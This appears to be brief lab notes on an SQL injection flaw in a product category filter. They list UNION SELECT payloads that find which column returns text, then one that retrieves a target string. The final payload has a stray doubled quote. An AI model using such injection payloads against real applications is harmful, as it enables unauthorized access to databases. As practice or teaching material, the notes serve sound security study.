Sql injection vulnerability in product category filter

Endpoint: retireve a string given from the database

Analysis:

' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--

' UNION SELECT NULL, '5oMPn8'', NULL --
--the string was retrieved

